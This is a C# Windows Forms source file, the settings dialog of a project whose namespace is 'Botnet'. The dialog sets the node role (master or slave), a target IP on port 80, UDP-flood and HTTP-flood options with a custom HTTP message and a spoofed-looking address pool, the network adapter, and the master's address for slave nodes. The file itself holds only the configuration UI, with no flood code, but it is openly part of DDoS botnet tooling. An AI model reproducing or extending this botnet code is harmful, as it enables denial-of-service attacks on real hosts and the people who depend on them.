using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.NetworkInformation;

namespace Botnet
{
    public partial class SettingsForm : Form
    {
        private NetworkInterface[] Adapters;
        private NetworkInterface curAdapter;
        public delegate void SetSettingsCallBack(AttackParams Params, NetworkInterface Adapter, int port, IPEndPoint MasterAddr);
        SetSettingsCallBack SetSettings;

        public SettingsForm(AttackParams Params, NetworkInterface CurAdapter, int curport, SetSettingsCallBack funct, bool mode, IPEndPoint OldMaster)
        {
            InitializeComponent();
            SetSettings = funct;
            curAdapter = CurAdapter;
            CurAdapterLabel.Text = CurAdapter.Name + " - Status: " + CurAdapter.OperationalStatus + " Type:" + CurAdapter.NetworkInterfaceType;
            fillAdapterList();
            FillPreviousSettings(Params, curport);
            RoleCheckBox.Enabled = true;
            if (mode)
            {
                AttackParamsBox.Enabled = true;
                RoleCheckBox.Checked = true;
                if(Params.UdpFloodEnabled)
                {
                    FloodEnablingCheckBox.Checked = true;
                    RestPoolsSetBox.Enabled = true;
                }
                else
                {
                    FloodEnablingCheckBox.Checked = false;
                    RestPoolsSetBox.Enabled = false;
                }
                if(Params.HttpFloodEnabled)
                {
                    HttpSetsCheckBox.Checked = true;
                    HttpsSetsBox.Enabled = true;
                }
                else
                {
                    HttpSetsCheckBox.Checked = false;
                    HttpsSetsBox.Enabled = false;
                }

            }
            else
            {
                RoleCheckBox.Checked = false;
                AttackParamsBox.Enabled = false;
                MasterIpBox.Text = OldMaster.Address.ToString();
                MasterPortBox.Value = OldMaster.Port;
            }



        }
        private void FillPreviousSettings(AttackParams Params, int cur_port)
        {
            TargetAddressBox.Text = Params.Target.Address.ToString();
            HttpSetsCheckBox.Checked = Params.HttpFloodEnabled;
            FloodEnablingCheckBox.Checked = Params.UdpFloodEnabled;
            HttpContentBox.Text = Params.HttpMsg;
            RestStartBox.Text = Params.RestrictedPool[0].ToString();
            RestEndBox.Text = Params.RestrictedPool[1].ToString();
            portBox.Value = cur_port;
        }
        private void SetParamnBtn_Click(object sender, EventArgs e)
        {
            int port = Convert.ToInt32(portBox.Value);
            try
            {
                IPAddress TargAddress = IPAddress.Parse(TargetAddressBox.Text);
                if (RoleCheckBox.Checked)
                {
                    IPEndPoint Target = new IPEndPoint(TargAddress, 80);
                    AttackParams Params = new AttackParams();
                    Params.Target = Target;
                    if (HttpSetsCheckBox.Checked)
                    {
                        Params.HttpMsg = HttpContentBox.Text;
                        Params.HttpFloodEnabled = true;
                    }
                    else
                    {
                        Params.HttpMsg = "";
                        Params.HttpFloodEnabled = false;
                    }
                    if (FloodEnablingCheckBox.Checked)
                    {
                        Params.UdpFloodEnabled = true;
                        Params.RestrictedPool = new NetworkInstruments.AddressPool(IPAddress.Parse(RestStartBox.Text), IPAddress.Parse(RestEndBox.Text));
                    }
                    else
                    {
                        Params.UdpFloodEnabled = false;
                    }
                    SetSettings(Params, Adapters[AdapterBox.SelectedIndex], port, null);

                }
                else
                {
                    SetSettings(new AttackParams(), Adapters[AdapterBox.SelectedIndex], port, new IPEndPoint(IPAddress.Parse(MasterIpBox.Text), Convert.ToUInt16(MasterPortBox.Value)));
                }
                this.Close();
            }
            catch (Exception)
            {
                MessageBox.Show("Введенные данные некорректны", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }


        }

        private void CancelBtn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void FloodEnablingCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (FloodEnablingCheckBox.Checked)
            {
                RestPoolsSetBox.Enabled = true;
            }
            else
            {
                RestPoolsSetBox.Enabled = false;
                if (!HttpSetsCheckBox.Checked) HttpSetsCheckBox.Checked = true;
            }
        }

        private void AdapterBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            IpLab.Text = NetworkInstruments.getAdapterIPAddress(Adapters[AdapterBox.SelectedIndex]).ToString();
            MacLab.Text = Adapters[AdapterBox.SelectedIndex].GetPhysicalAddress().ToString();

        }
        private void fillAdapterList()
        {
            Adapters = NetworkInterface.GetAllNetworkInterfaces();  
            //choose only valid adapters
            for (int i = 0; i < Adapters.Length; ++i)
            {
                if (Adapters[i].OperationalStatus == OperationalStatus.Up && Adapters[i].NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    AdapterBox.Items.Add(Adapters[i].Name + " Status: " + Adapters[i].OperationalStatus.ToString() + " Type: " + Adapters[i].NetworkInterfaceType);
                    if (Adapters[i].Id == curAdapter.Id)
                    {
                        AdapterBox.SelectedIndex = i;
                    } 
                }
            }
            if(AdapterBox.SelectedIndex == -1 && AdapterBox.Items.Count != 0)
            {
                AdapterBox.SelectedIndex = 0;
            }
        }

        private void RoleCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (RoleCheckBox.Checked)
            {
                masterPointBox.Enabled = false;
                AttackParamsBox.Enabled = true;
            }
            else
            {
                masterPointBox.Enabled = true;
                AttackParamsBox.Enabled = false;
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (HttpSetsCheckBox.Checked)
            {
                HttpsSetsBox.Enabled = true;
            }
            else
            {
                HttpsSetsBox.Enabled = false;
                if (!FloodEnablingCheckBox.Checked) FloodEnablingCheckBox.Checked = true;
            }
        }
    }
}
